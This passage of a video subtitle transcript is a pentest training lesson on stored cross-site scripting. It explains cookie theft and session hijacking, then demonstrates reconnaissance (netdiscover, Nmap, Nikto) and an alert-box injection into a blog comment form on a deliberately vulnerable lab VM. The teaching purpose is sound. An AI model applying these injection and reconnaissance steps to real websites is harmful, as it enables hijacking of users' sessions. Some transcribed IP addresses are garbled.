exists,\n\n40\n00:01:49.620 --> 00:01:53.732\nthe code executes and\nthings happen to their client.\n\n41\n00:01:53.732 --> 00:02:00.010\n&gt;&gt; It's a really dangerous type of attack\nbecause you as a customer of a website,\n\n42\n00:02:00.010 --> 00:02:04.540\na visitor to a web page,\nyou don't have to be vulnerable, right?\n\n43\n00:02:04.540 --> 00:02:07.770\nYour system is patched up,\nyou're doing the right things,\n\n44\n00:02:07.770 --> 00:02:10.880\nyou're making sure that you've got\nthe latest security updates and all that.\n\n45\n00:02:10.880 --> 00:02:13.290\nYou're just visiting a website and\n\n46\n00:02:13.290 --> 00:02:17.760\nthe problem is your browser is doing\nexactly what it's supposed to do.\n\n47\n00:02:17.760 --> 00:02:20.950\nIt's interpreting what's being\nsent to it and it's executing it.\n\n48\n00:02:20.950 --> 00:02:26.370\nThe problem is the website was vulnerable\nand so in order to attack you, I said let\n\n49\n00:02:26.370 --> 00:02:30.380\nme go around about and hit the website and\nthen have that attack launch from there.\n\n50\n00:02:30.380 --> 00:02:31.630\nSo it's really scary,\n\n51\n00:02:31.630 --> 00:02:35.380\nit's really dangerous and\nhard to protect against as an individual.\n\n52\n00:02:35.380 --> 00:02:37.870\nIt's the corporations that\nare hosting the web servers\n\n53\n00:02:37.870 --> 00:02:38.760\nthat need to protect against it.\n\n54\n00:02:38.760 --> 00:02:39.730\n&gt;&gt; That's exactly right.\n\n55\n00:02:39.730 --> 00:02:41.750\nIt's not your fault per se, right?\n\n56\n00:02:41.750 --> 00:02:43.590\nAll you did was browse to a website.\n\n57\n00:02:43.590 --> 00:02:45.730\nYou just wanna take\nadvantage of the Internet.\n\n58\n00:02:45.730 --> 00:02:47.650\nAs any of us would rightfully want to do.\n\n59\n00:02:47.650 --> 00:02:48.230\nIt's a lot of fun.\n\n60\n00:02:48.230 --> 00:02:51.207\nLot of cool stuff out there for\nus to learn and see and participate in.\n\n61\n00:02:51.207 --> 00:02:51.731\n&gt;&gt; We're out there!\n\n62\n00:02:51.731 --> 00:02:53.970\n&gt;&gt; Right!\nHey, ITProTV, go check it out, right?\n\n63\n00:02:53.970 --> 00:02:56.430\nThat being said, you gotta remember this.\n\n64\n00:02:56.430 --> 00:03:02.050\nBecause it does affect the end user, that\nis what the intention is typically for.\n\n65\n00:03:02.050 --> 00:03:04.800\nI want to get to users, and\n\n66\n00:03:04.800 --> 00:03:08.780\nnot necessarily attack the website\nwhere I've put my malicious code.\n\n67\n00:03:08.780 --> 00:03:11.750\nI'm just using that as\na spring board of operations,\n\n68\n00:03:11.750 --> 00:03:14.690\nas it were, to get at end users.\n\n69\n00:03:14.690 --> 00:03:16.140\n&gt;&gt; That's my attack vector.\n\n70\n00:03:16.140 --> 00:03:16.960\n&gt;&gt; Yeah, yeah.\n\n71\n00:03:16.960 --> 00:03:17.790\nPerfect, exactly.\n\n72\n00:03:17.790 --> 00:03:20.353\nThe attack vector,\nwhere it's coming from, right?\n\n73\n00:03:20.353 --> 00:03:22.360\nSo keep that in mind\nas we go through here.\n\n74\n00:03:22.360 --> 00:03:26.670\nWe're not attacking their website,\nwe're attacking the users that visit their\n\n75\n00:03:26.670 --> 00:03:30.807\nwebsite, they just happened to leave the\ndoor open for us to be able to do that.\n\n76\n00:03:30.807 --> 00:03:33.590\nSo that's cross-site scripting in a ball.\n\n77\n00:03:33.590 --> 00:03:35.810\nLet me see if there's anything else\nI wanted to mention about that.\n\n78\n00:03:35.810 --> 00:03:39.220\nTypically, the payloads are going\nto be in some sort of HTML or\n\n79\n00:03:39.220 --> 00:03:43.870\nJava scripting because they're web\ntype of programming languages.\n\n80\n00:03:43.870 --> 00:03:45.370\nSo if you're running a browser,\nwhat does it do?\n\n81\n00:03:45.370 --> 00:03:47.450\nIt interprets web programming languages.\n\n82\n00:03:47.450 --> 00:03:48.516\nSo that's why we typically see those.\n\n83\n00:03:52.120 --> 00:03:53.910\nWho are we targeting normally?\n\n84\n00:03:53.910 --> 00:03:56.750\nRight.\nIf I'm the bad guy, if I'm the actor or\n\n85\n00:03:56.750 --> 00:03:59.790\nif I'm a penetration tester trying\nto do a company's Internet site or\n\n86\n00:03:59.790 --> 00:04:02.170\nsomething to that affect,\nwho am I looking for?\n\n87\n00:04:02.170 --> 00:04:07.560\nWell, I'll take anybody I can get but,\nas always, we're looking for admins.\n\n88\n00:04:07.560 --> 00:04:11.450\nWe wanna get a hold of those\npeople's information or\n\n89\n00:04:11.450 --> 00:04:14.510\ntake advantage of their browser,\nget them to send us information.\n\n90\n00:04:14.510 --> 00:04:15.630\nWhatever the case is.\n\n91\n00:04:15.630 --> 00:04:18.325\nWe wanna go for the good stuff, right?\n\n92\n00:04:18.325 --> 00:04:20.590\nThat's our intended targets.\n\n93\n00:04:20.590 --> 00:04:22.200\nSometimes it's just anybody and\n\n94\n00:04:22.200 --> 00:04:26.300\ntheir brother will do cuz that gives\nme another attack vector to go for.\n\n95\n00:04:26.300 --> 00:04:27.760\nAll right,\nlet's see what else do we wanna hear?\n\n96\n00:04:27.760 --> 00:04:31.100\nHow do we check to see if\nour website is vulnerable?\n\n97\n00:04:31.100 --> 00:04:34.880\nThat is a good question and\ntypically we do that\n\n98\n00:04:34.880 --> 00:04:40.062\nby looking using vulnerability scanners,\nlooking for a good code.\n\n99\n00:04:40.062 --> 00:04:44.860\nYou wanna check and make sure that if you\nhave a programmer that's building your\n\n100\n00:04:44.860 --> 00:04:50.029\nsite, verify with them are you\nusing input sanitation?\n\n101\n00:04:51.350 --> 00:04:54.260\nWhen I put something\ninto input into our site,\n\n102\n00:04:54.260 --> 00:04:58.700\ndoes it go through some sort of washing,\nscrubbing, microscopic looking thing?\n\n103\n00:04:58.700 --> 00:05:03.275\nIs this what I expect to see and if it's\nnot, we dump that and give them an error?\n\n104\n00:05:03.275 --> 00:05:04.370\nOr is it just allowing that to happen?\n\n105\n00:05:04.370 --> 00:05:08.381\nWe're gonna see that it's typical with\na lot of web-based attacks, is that\n\n106\n00:05:08.381 --> 00:05:13.133\nthe programmer's developments, and don't\nget me wrong, it's not that they're trying\n\n107\n00:05:13.133 --> 00:05:17.637\nto be insecure, things get overlooked, and\nwe have to continually look and search for\n\n108\n00:05:17.637 --> 00:05:22.485\nholes in the code for problems so that\nthese types of things don't come through.\n\n109\n00:05:22.485 --> 00:05:23.979\nYou and I as penetration testers,\n\n110\n00:05:23.979 --> 00:05:26.928\nwe're gonna intervene with things\nlike vulnerability scanners.\n\n111\n00:05:26.928 --> 00:05:33.220\nWill they find that cross-site scripting\nability in there, that can help.\n\n112\n00:05:33.220 --> 00:05:35.336\nAnd we can just peruse\nthe website looking for\n\n113\n00:05:35.336 --> 00:05:38.760\ncertain things that would key us\noff that this might be vulnerable.\n\n114\n00:05:38.760 --> 00:05:42.840\n&gt;&gt; And you might think as an organization\nwhy would I even bother looking for this?\n\n115\n00:05:42.840 --> 00:05:45.310\nIt's just told me it's not\naffecting my web server,\n\n116\n00:05:45.310 --> 00:05:49.490\nit's the people that are visiting my site\nbut I think common sense will tell you.\n\n117\n00:05:49.490 --> 00:05:52.370\nYou don't want your visitors\ncoming to your site, get infected,\n\n118\n00:05:52.370 --> 00:05:56.250\nand then word gets out that hey,\nthis is a dangerous site, don't go to it.\n\n119\n00:05:56.250 --> 00:05:59.330\nDon't spend your money there, God forbid,\nput your credit card information in there\n\n120\n00:05:59.330 --> 00:06:01.285\nbecause I got infected\njust visiting their site.\n\n121\n00:06:01.285 --> 00:06:05.042\nSo who knows what's gonna happen if\nyou try to buy something from them, so\n\n122\n00:06:05.042 --> 00:06:09.222\nas an organization, I definitely wanna\nmake sure I'm protected against this cuz\n\n123\n00:06:09.222 --> 00:06:12.208\nthat's my reputation of my\nbusiness that's on the line.\n\n124\n00:06:12.208 --> 00:06:16.192\n&gt;&gt; Yeah, you as an entity out there don't\nwant to be providing a platform for\n\n125\n00:06:16.192 --> 00:06:19.672\nbad actors to do something against\nyour users, that's a great way for\n\n126\n00:06:19.672 --> 00:06:21.592\npeople to go, well,\nI'm never going there again, right?\n\n127\n00:06:21.592 --> 00:06:24.932\nAnd then your site shuts down\nbecause your traffic drops down.\n\n128\n00:06:24.932 --> 00:06:30.440\nSo, if you have any kind of form\non your website that allows for\n\n129\n00:06:30.440 --> 00:06:34.700\nany user to input into the system,\ncuz that's what's happening here.\n\n130\n00:06:34.700 --> 00:06:37.180\nI'm coming in,\nI'm not an authority in the system.\n\n131\n00:06:37.180 --> 00:06:41.698\nYou're giving me input access that\nthen takes that input, stores it.\n\n132\n00:06:41.698 --> 00:06:46.280\nAnd if you're not doing any kind of\nsanitation then it's going to execute code\n\n133\n00:06:46.280 --> 00:06:50.110\nas people come to that site, because it\njust becomes part of the code of the page.\n\n134\n00:06:50.110 --> 00:06:51.650\nSo that's what we're looking out for.\n\n135\n00:06:51.650 --> 00:06:55.250\nSo things like comment sections on blogs,\n\n136\n00:06:55.250 --> 00:06:58.760\nanywhere where you can\ninput from anywhere, right.\n\n137\n00:06:58.760 --> 00:07:00.740\nSo if you're just a random user,\nyou come to the site.\n\n138\n00:07:00.740 --> 00:07:03.000\nAnd I say hey, leave comments here,\n\n139\n00:07:03.000 --> 00:07:07.980\nor just anything where there's\ninput that will store on the page.\n\n140\n00:07:07.980 --> 00:07:10.438\n&gt;&gt; And just about every website you go\nto nowadays has this at some point,\n\n141\n00:07:10.438 --> 00:07:12.030\nespecially if you're gonna buy something.\n\n142\n00:07:12.030 --> 00:07:16.332\nOr they'll make you register in order to\nread the rest of the forum posts that\n\n143\n00:07:16.332 --> 00:07:20.702\nyou're reading, so they're taking input,\nthey want your email address,\n\n144\n00:07:20.702 --> 00:07:24.737\nthey want your name and maybe some\ndemographical information as well or\n\n145\n00:07:24.737 --> 00:07:27.860\nlike you said hey write a comment here.\n\n146\n00:07:27.860 --> 00:07:29.870\nSo you see the input everywhere.\n\n147\n00:07:29.870 --> 00:07:33.480\n&gt;&gt; Yeah, forums right, that's kind of what\nthe whole purpose of a forum is, it's for\n\n148\n00:07:33.480 --> 00:07:36.560\nyou to be able to log in and\nleave a comment and\n\n149\n00:07:36.560 --> 00:07:37.900\nthen have a thread going, right?\n\n150\n00:07:37.900 --> 00:07:42.020\nSo that's where we're gonna see these\nthings executed because it allows\n\n151\n00:07:42.020 --> 00:07:45.674\nme as an end user to input code into\nthe system and leave it there for\n\n152\n00:07:45.674 --> 00:07:47.951\nsomeone else to come by and get hit by it.\n\n153\n00:07:47.951 --> 00:07:49.865\nSo, let's move on here.\n\n154\n00:07:49.865 --> 00:07:53.835\nLet's talk about some common\ncross-site scripting type of attacks.\n\n155\n00:07:53.835 --> 00:07:55.078\nOne is browser redirection.\n\n156\n00:07:55.078 --> 00:07:58.938\nI can put in code in there to say,\nredirect to this site,\n\n157\n00:07:58.938 --> 00:08:00.757\nor redirect to that site.\n\n158\n00:08:00.757 --> 00:08:06.850\nAnd if you have spent any time in\nsecurity, you know about this, right.\n\n159\n00:08:06.850 --> 00:08:11.430\nYou get an email that says click this\nlink so that you can claim your prize or\n\n160\n00:08:11.430 --> 00:08:12.330\nwhatever.\n\n161\n00:08:12.330 --> 00:08:14.400\nAnd as a browser redirection\nis taking you somewhere else.\n\n162\n00:08:14.400 --> 00:08:15.814\nIt says Facebook.com.\n\n163\n00:08:15.814 --> 00:08:17.000\nIt says ITPro.TV.\n\n164\n00:08:17.000 --> 00:08:18.240\nIt doesn't say that.\n\n165\n00:08:18.240 --> 00:08:20.530\nIt never has ours on there.\n\n166\n00:08:20.530 --> 00:08:21.669\nBut so you have to check the URL and\n\n167\n00:08:21.669 --> 00:08:24.110\nmake sure that it's taking you\nwhere you're supposed to go.\n\n168\n00:08:24.110 --> 00:08:28.138\nWe can do that with the code, it's just\nembedded into the code of the website to\n\n169\n00:08:28.138 --> 00:08:31.025\nredirect to the user that\ncomes to a different website.\n\n170\n00:08:31.025 --> 00:08:34.723\nAnd that's really good for the attacker\nbecause they can glean a lot of\n\n171\n00:08:34.723 --> 00:08:38.798\ninformation that way and it can set them\nup for things like client side attacks\n\n172\n00:08:38.798 --> 00:08:42.071\nwhich we are going to discuss and\nshow you upcoming very soon.\n\n173\n00:08:42.071 --> 00:08:44.960\nAlso good for session hijacking,\ncookie stealing.\n\n174\n00:08:44.960 --> 00:08:46.460\nThis is one of the big ones, right?\n\n175\n00:08:46.460 --> 00:08:47.900\nThis is a big deal.\n\n176\n00:08:47.900 --> 00:08:53.490\nThat I'm able to take over your session\nas an end user because when you log in,\n\n177\n00:08:53.490 --> 00:08:55.250\nit gives you a session cookie, right?\n\n178\n00:08:55.250 --> 00:08:57.710\nAnd then you have that cookie and\nas long as that cookie is valid for\n\n179\n00:08:57.710 --> 00:09:01.660\nx amount of time or as long as you\ndon't log out, the cookie is valid.\n\n180\n00:09:03.220 --> 00:09:08.940\nI can grab that cookie, put it into\nmy browser, and it thinks I'm you.\n\n181\n00:09:08.940 --> 00:09:10.930\nSo it's kind of this\nmasquerading type of effect.\n\n182\n00:09:10.930 --> 00:09:12.420\n&gt;&gt; Yeah.\nAnd depending on what the company has\n\n183\n00:09:12.420 --> 00:09:16.250\nchosen to put or store in those cookies,\ncuz that can vary,\n\n184\n00:09:16.250 --> 00:09:19.990\nthey might just be simply storing your\nusername and password to access the site.\n\n185\n00:09:19.990 --> 00:09:20.870\nBut they may be storing,\n\n186\n00:09:20.870 --> 00:09:24.580\nif you've enabled any kind of one-click\npurchase options and things like that.\n\n187\n00:09:24.580 --> 00:09:29.290\nA lot of times, we can store credit\ncard information in those cookies, cuz,\n\n188\n00:09:29.290 --> 00:09:32.980\ngosh forbid, we'd have to type that number\nin every time we wanna buy something.\n\n189\n00:09:32.980 --> 00:09:36.190\nAnd so, if they steal that, as you said,\nthey're basically impersonating you,\n\n190\n00:09:36.190 --> 00:09:38.550\nand anything else that's\nstored in that cookie,\n\n191\n00:09:38.550 --> 00:09:40.340\ntheir browser can now\nsubmit to the website.\n\n192\n00:09:40.340 --> 00:09:42.810\nAnd the website's gonna\ntrust the information\n\n193\n00:09:42.810 --> 00:09:44.520\nbecause it's their cookie, right?\n\n194\n00:09:44.520 --> 00:09:46.210\nAnd so\nit's just doing what it's supposed to do.\n\n195\n00:09:46.210 --> 00:09:47.200\n&gt;&gt; That's exactly right.\n\n196\n00:09:47.200 --> 00:09:52.060\nSo, that being said, let's talk about\nhow can we actually perform this task?\n\n197\n00:09:52.060 --> 00:09:57.160\nHow can we do a session hijack,\nsteal cookie, and impersonate\n\n198\n00:09:57.160 --> 00:10:00.450\nsomebody else that was a user on that\nsite, hopefully, the administrator.\n\n199\n00:10:00.450 --> 00:10:04.740\nWell the good news is we have an attack\nplatform that's perfect for this.\n\n200\n00:10:04.740 --> 00:10:10.306\nI downloaded a virtual machine\nfrom volnhub.com called,\n\n201\n00:10:10.306 --> 00:10:16.328\nI think it's MySQL, yeah,\nI wrote it down here, xss-MySQL.\n\n202\n00:10:16.328 --> 00:10:19.100\nSo right here,\nI kinda made a directory for it.\n\n203\n00:10:19.100 --> 00:10:22.150\nBut you can go to volnhub.com, and we'd\nlike to give a shout out to those guys,\n\n204\n00:10:22.150 --> 00:10:24.050\nthank you guys for\nallowing us to use these for\n\n205\n00:10:24.050 --> 00:10:26.460\ndemonstration purposes for our viewers.\n\n206\n00:10:26.460 --> 00:10:29.190\nSuper awesome style that you did for\nus, I appreciate that.\n\n207\n00:10:29.190 --> 00:10:30.190\nSo you guys can go there, and\n\n208\n00:10:30.190 --> 00:10:33.230\nif you want to do exactly what it\nis I'm doing, you can follow along.\n\n209\n00:10:33.230 --> 00:10:34.660\nYou just have to have your Kali box up and\n\n210\n00:10:34.660 --> 00:10:38.770\nrunning, fire off this virtual machine,\nit should be very simple to get up and\n\n211\n00:10:38.770 --> 00:10:42.420\nrunning if you work with\nvirtualization at all, very simple.\n\n212\n00:10:42.420 --> 00:10:45.460\nI don't think even it's that large\nof a file so just fire that off,\n\n213\n00:10:45.460 --> 00:10:47.930\nget them in a sand bust network.\n\n214\n00:10:47.930 --> 00:10:50.170\nRemember, we don't want these things\ntouching the internet because they\n\n215\n00:10:50.170 --> 00:10:54.220\nare vulnerable by design but it's gonna\nallow us to show you how to do these\n\n216\n00:10:54.220 --> 00:10:57.930\nthings, and then you can practice\nthe exact same techniques as well.\n\n217\n00:10:57.930 --> 00:11:04.390\nAll right, so I do have that machine\nrunning, there it is right here.\n\n218\n00:11:04.390 --> 00:11:05.890\nIt's just sitting here doing nothing,\n\n219\n00:11:05.890 --> 00:11:09.070\nwaiting, running a website is what it's\ndoing, and I say it's doing nothing.\n\n220\n00:11:09.070 --> 00:11:09.850\nIt's running a website.\n\n221\n00:11:11.110 --> 00:11:12.203\nHere's my Kali box,\n\n222\n00:11:12.203 --> 00:11:15.606\nI like to create directories to keep\nthings a little more ordered so\n\n223\n00:11:15.606 --> 00:11:19.401\nwe're gonna work with some files that\nI have in here so that we can do this.\n\n224\n00:11:19.401 --> 00:11:24.254\nBut if I go to my web browser, I also\nwant to show you one more thing that\n\n225\n00:11:24.254 --> 00:11:28.607\nyou should get installed so\nthat you can do this technique is,\n\n226\n00:11:28.607 --> 00:11:34.430\nif I go into my tools I have this little\nplugin called Cookie Managers Plus.\n\n227\n00:11:34.430 --> 00:11:38.550\nGreat tool, download it, it is,\nI guess it runs for chrome I'm not sure.\n\n228\n00:11:38.550 --> 00:11:42.360\nI run Firefox,\nIceWeasel is what comes with Kali.\n\n229\n00:11:42.360 --> 00:11:45.540\nAnd IceWeasel is a derivative of Firefox,\nis basically Firefox.\n\n230\n00:11:45.540 --> 00:11:48.200\nSo all the Firefox plugins will work here.\n\n231\n00:11:48.200 --> 00:11:49.400\nI'm just not sure if it works for Chrome.\n\n232\n00:11:49.400 --> 00:11:51.300\nI know it works for Firefox.\n\n233\n00:11:51.300 --> 00:11:55.030\nSo there you go, download Cookies Managers\nPlus cuz we're going to need that so\n\n234\n00:11:55.030 --> 00:11:57.760\nthat we can perpetrate this attack.\n\n235\n00:11:57.760 --> 00:12:02.235\nThat being said, I'll just shrink\nmy browser and let's get started.\n\n236\n00:12:02.235 --> 00:12:03.115\nAs in any pen test,\n\n237\n00:12:03.115 --> 00:12:06.310\nwe got to scan for the systems,\nfind out what their IP addresses are.\n\n238\n00:12:06.310 --> 00:12:09.420\nSo we'll just kind of take you through\nthat little process very quickly.\n\n239\n00:12:09.420 --> 00:12:13.160\nYou can do a ping sweep,\nyou can do an Nmap's ping sweep.\n\n240\n00:12:13.160 --> 00:12:19.588\nSince I'm on a local network together,\nI can do net discover, like that and\n\n241\n00:12:19.588 --> 00:12:23.496\n-i and give it eth0,\nthat's my ethernet adaptor.\n\n242\n00:12:23.496 --> 00:12:28.725\nAnd then -r for range and\nwhat range of IPs we're on,\n\n243\n00:12:28.725 --> 00:12:34.920\n101.68.29.1 and\nthen slash use the side notation.\n\n244\n00:12:34.920 --> 00:12:38.400\nIt return, that's a start,\nhopefully seeing some stuff here.\n\n245\n00:12:38.400 --> 00:12:39.620\nThere we go.\n\n246\n00:12:39.620 --> 00:12:44.018\nAnd I know 200 is my Windows machine,\n254 is the gateway,\n\n247\n00:12:44.018 --> 00:12:48.100\n1 is my MacBook and then so\n157 must be my culprit there.\n\n248\n00:12:48.100 --> 00:12:49.830\nThat must be what I'm looking for.\n\n249\n00:12:49.830 --> 00:12:54.360\nSo I'll do Ctrl C and\nthat will run an NMAP scan.\n\n250\n00:12:54.360 --> 00:12:58.845\nI'll do a -a which includes some\nNMAP scripting engine stuff,\n\n251\n00:12:58.845 --> 00:13:03.770\nnon-dangerous scripts usually in there.\n\n252\n00:13:03.770 --> 00:13:05.211\nI think, all of them are non-dangerous so\n\n253\n00:13:05.211 --> 00:13:07.370\nyou don't have to worry\nabout crashing anything.\n\n254\n00:13:07.370 --> 00:13:09.730\nBut it does still glean\na lot of good information.\n\n255\n00:13:09.730 --> 00:13:12.371\nAlso does a scene scan.\n\n256\n00:13:12.371 --> 00:13:13.810\n&gt;&gt; There's always fingerprinting.\n\n257\n00:13:13.810 --> 00:13:15.100\n&gt;&gt; Yeah, always fingerprinting.\n\n258\n00:13:15.100 --> 00:13:16.280\n&gt;&gt; Versioning.\n&gt;&gt; Versioning.\n\n259\n00:13:16.280 --> 00:13:17.540\nThe whole nine yards.\n\n260\n00:13:17.540 --> 00:13:21.520\nIt's, DASH A is kind of an all-in-one for\nNmap.\n\n261\n00:13:21.520 --> 00:13:24.220\nAnd then I like to,\nbecause it's pen testing,\n\n262\n00:13:24.220 --> 00:13:27.510\ngive it a little more of aggressive\ntiming so it goes a little faster.\n\n263\n00:13:27.510 --> 00:13:32.920\nI also want to look at every port and\nthat should be good and\n\n264\n00:13:32.920 --> 00:13:38.610\nI'll give it the IP 102.168.209.157 and\nwe'll fire that off.\n\n265\n00:13:38.610 --> 00:13:42.170\nTypically, I would output that to\na file so I can look at it later.\n\n266\n00:13:42.170 --> 00:13:45.700\nIt's just part of my methodology but you\ndon't have to do that if you don't want\n\n267\n00:13:45.700 --> 00:13:47.770\nit, you just continually run\nMF scans if you feel like it.\n\n268\n00:13:47.770 --> 00:13:49.260\nYou never know when things change.\n\n269\n00:13:49.260 --> 00:13:51.380\nMaybe a new port comes up and doesn't.\n\n270\n00:13:51.380 --> 00:13:53.820\nBut I know that I'm not doing that here so\nI like to do that.\n\n271\n00:13:53.820 --> 00:13:55.760\nIt keeps things very simple.\n\n272\n00:13:55.760 --> 00:13:59.200\nI know things like, it's taking forever,\nwhile it's doing that, I'm gonna run also\n\n273\n00:13:59.200 --> 00:14:04.190\ndown here my Nitko scan, which is the scan\nfor vulnerabilities inside of websites.\n\n274\n00:14:04.190 --> 00:14:06.790\nAnd look, Nmap's already done.\n\n275\n00:14:06.790 --> 00:14:09.620\nSo there it is, it is telling\nus that port 22 is open, SSH.\n\n276\n00:14:09.620 --> 00:14:13.720\nGives us the SSH host keys,\nthe DSA and the RSA.\n\n277\n00:14:13.720 --> 00:14:15.400\nAnd then there's good old port A, so\n\n278\n00:14:15.400 --> 00:14:19.190\nI know a web server's running\non 192.168 on that device.\n\n279\n00:14:21.960 --> 00:14:26.535\nAnd it tells me a lot about it too,\napache 2.2.6, it's on a WN system,\n\n280\n00:14:26.535 --> 00:14:31.220\nwhere it came from some http title info,\nvery good stuff.\n\n281\n00:14:31.220 --> 00:14:36.252\nSo let's run that Nikto scan as well,\nN I K T O -H for host and\n\n282\n00:14:36.252 --> 00:14:43.729\nthen its just the IP address\n192.168.219.1 and it's 57 fire that off.\n\n283\n00:14:43.729 --> 00:14:46.099\nIts a little faster than\nour Nmap scan was but\n\n284\n00:14:46.099 --> 00:14:48.740\nit's come up with some\ngreat information here.\n\n285\n00:14:50.120 --> 00:14:53.637\nI'll scroll through it,\nat the very top some interesting stuff.\n\n286\n00:14:53.637 --> 00:14:57.460\nLook, the XSS protection\nheader is not defined.\n\n287\n00:14:58.600 --> 00:15:02.450\nThat might be leading me to believe that\nthis might be vulnerable to cross side\n\n288\n00:15:02.450 --> 00:15:07.570\nscripting cuz that header is not\ndefined which is meant to be for\n\n289\n00:15:07.570 --> 00:15:08.700\nprotection against XSS attacks.\n\n290\n00:15:08.700 --> 00:15:12.130\nSo it says that this header can hint\n\n291\n00:15:12.130 --> 00:15:14.980\nto the user agent to protect\nagainst some forms of XSS.\n\n292\n00:15:14.980 --> 00:15:17.320\nSo it's letting you know this\nmight have that vulnerability,\n\n293\n00:15:17.320 --> 00:15:20.040\nyou might want to check\nthat as an attack vector.\n\n294\n00:15:20.040 --> 00:15:25.150\nSo now that we know that might be\nthe case, I'll open up IceWeasel yet\n\n295\n00:15:25.150 --> 00:15:28.089\nagain, and let's peruse to that page.\n\n296\n00:15:28.089 --> 00:15:35.645\n192.168.219.157, if I'm not mistaken.\n\n297\n00:15:35.645 --> 00:15:38.350\nAnd there we go,\nit's a blog site, very cool.\n\n298\n00:15:38.350 --> 00:15:39.830\nAll right, so it's my blog.\n\n299\n00:15:39.830 --> 00:15:43.825\nVery simple site, not unlike many sites\nthat you might have encountered just\n\n300\n00:15:43.825 --> 00:15:45.340\nperusing through the internet.\n\n301\n00:15:45.340 --> 00:15:47.020\nVery cool stuff so it just says my blog.\n\n302\n00:15:47.020 --> 00:15:50.660\nI've got a couple of links over here,\nhome, and admin.\n\n303\n00:15:50.660 --> 00:15:54.431\nAdmin seems promising,\nlet's take a look at that.\n\n304\n00:15:54.431 --> 00:15:56.755\nWe got ourselves a nice log in prompt so\n\n305\n00:15:56.755 --> 00:16:00.252\nthis would be the administrative\narea of this blog site.\n\n306\n00:16:00.252 --> 00:16:02.978\nIf I knew the credentials,\nI could log in and administer the site.\n\n307\n00:16:02.978 --> 00:16:06.709\nThat might be something I wanna do as\na bad actor or a penetration tester,\n\n308\n00:16:06.709 --> 00:16:07.340\nall right?\n\n309\n00:16:07.340 --> 00:16:08.250\nSo I'm gonna keep that in mind.\n\n310\n00:16:08.250 --> 00:16:11.340\nI'm gonna come back here.\n\n311\n00:16:11.340 --> 00:16:13.430\nAnd look at that.\n\n312\n00:16:13.430 --> 00:16:15.330\nBe the first to comment.\n\n313\n00:16:15.330 --> 00:16:17.790\nWell that sounds fun, let's do comments.\n\n314\n00:16:17.790 --> 00:16:18.470\n&gt;&gt; Let's do.\n&gt;&gt; All right, so\n\n315\n00:16:18.470 --> 00:16:20.660\nthis is where we're like, okay.\n\n316\n00:16:20.660 --> 00:16:23.632\nAs the penetration tester,\nI'm thinking to myself,\n\n317\n00:16:23.632 --> 00:16:26.869\nthis might have a vulnerability for\ncross site scripting.\n\n318\n00:16:26.869 --> 00:16:29.648\nSo I'm going to follow that rabbit trail.\n\n319\n00:16:29.648 --> 00:16:33.630\nSo I'm gonna go in here, I'm gonna say,\nokay, we've got a title area,\n\n320\n00:16:33.630 --> 00:16:35.450\nan author area, and then a text area.\n\n321\n00:16:36.960 --> 00:16:40.553\nI'm guessing that typically\nthat's going to be shown, and\n\n322\n00:16:40.553 --> 00:16:42.250\nwe can test this by doing it.\n\n323\n00:16:42.250 --> 00:16:48.882\nWe'll say title, testing, and author\nis tester and we'll just say testing.\n\n324\n00:16:48.882 --> 00:16:50.508\nLike that and submit the query.\n\n325\n00:16:51.983 --> 00:16:55.062\nNow we see in the comments there\nis one query that says testing but\n\n326\n00:16:55.062 --> 00:16:57.925\nthe title doesn't show up and\nthe author doesn't show up.\n\n327\n00:16:57.925 --> 00:16:59.810\nIt just shows the text.\n\n328\n00:16:59.810 --> 00:17:01.400\nSo I'm gonna stick with the text box,\n\n329\n00:17:01.400 --> 00:17:04.820\nthe actual comment box area itself,\nto put my code in.\n\n330\n00:17:04.820 --> 00:17:08.670\nAnd let's test if this thing is actually\nvulnerable to cross site scripting.\n\n331\n00:17:08.670 --> 00:17:11.430\nWe can do that pretty easily\nwith a very simple script.\n\n332\n00:17:11.430 --> 00:17:13.370\nJust a little HTML or, I don't know.\n\n333\n00:17:13.370 --> 00:17:14.170\nYeah, I think, it's HTML.\n\n334\n00:17:14.170 --> 00:17:17.250\nI'll just do a script first for\nJavaScript.\n\n335\n00:17:17.250 --> 00:17:20.720\nOpen script, like that.\n\n336\n00:17:20.720 --> 00:17:22.350\nAnd, oop, I'm sorry.\n\n337\n00:17:22.350 --> 00:17:23.640\nYeah, script.\n\n338\n00:17:23.640 --> 00:17:25.014\nAnd then, we'll say, alert.\n\n339\n00:17:26.351 --> 00:17:28.204\nOpen parentheses, open quotation.\n\n340\n00:17:28.204 --> 00:17:31.724\nAnd we'll just say testing like so.\n\n341\n00:17:31.724 --> 00:17:37.903\nClose that down and then,\nI think that's that and then slash.\n\n342\n00:17:37.903 --> 00:17:40.637\nOoh, I don't need that, where am I going?\n\n343\n00:17:40.637 --> 00:17:42.105\nNeed you, there we go.\n\n344\n00:17:42.105 --> 00:17:46.370\nAnd just close my script like that.\n\n345\n00:17:46.370 --> 00:17:50.200\nSo what I'm doing is I'm saying,\nI would like to, if this script runs,\n\n346\n00:17:50.200 --> 00:17:53.920\nit should pop up an alert box saying,\ntesting.\n\n347\n00:17:53.920 --> 00:17:56.000\nIf we're vulnerable to\ncross site scripting,\n\n348\n00:17:56.000 --> 00:17:58.330\nthat should work,\nif I typed it all correctly.\n\n349\n00:17:58.330 --> 00:18:00.420\nAnd I'll have to check my\ncode if it doesn't work.\n\n350\n00:18:00.420 --> 00:18:01.590\nSubmit.\nLook.\n\n351\n00:18:01.590 --> 00:18:03.800\nThere is a pop up box that says testing.\n\n352\n00:18:03.800 --> 00:18:06.770\nBingo.\nWe are cross site scripting golden.\n\n353\n00:18:06.770 --> 00:18:08.440\nThat allows us to be able to do that.\n\n354\n00:18:08.440 --> 00:18:12.070\nWe know that this site is\nvulnerable to this attack vector.\n\n355\n00:18:12.070 --> 00:18:13.560\nWe can do cross site scripting.\n\n356\n00:18:13.560 --> 00:18:14.660\nSo I can click OK.\n\n357\n00:18:14.660 --> 00:18:18.762\nNow every time comes to this site and\nthey go to that area,\n\n358\n00:18:18.762 --> 00:18:21.592\ntheir browser will fire off that code.\n\n359\n00:18:21.592 --> 00:18:22.810\nAnd I'll show you that.\n\n360\n00:18:22.810 --> 00:18:23.730\nHere's my Windows machine.\n\n361\n00:18:23.730 --> 00:18:26.390\nI'm a random Windows user\nhaving a good old time.\n\n362\n00:18:26.390 --> 00:18:28.730\nAw man, I gotta check my blog,\nit's lunch time.\n\n363\n00:18:28.730 --> 00:18:29.440\nI love that site.\n\n364\n00:18:29.440 --> 00:18:30.390\nThat guy is awesome.\n\n365\n00:18:30.390 --> 00:18:32.920\nThat chick is so cool,\nshe writes so many neat things.\n\n366\n00:18:34.130 --> 00:18:35.160\nThere we go.\n\n367\n00:18:35.160 --> 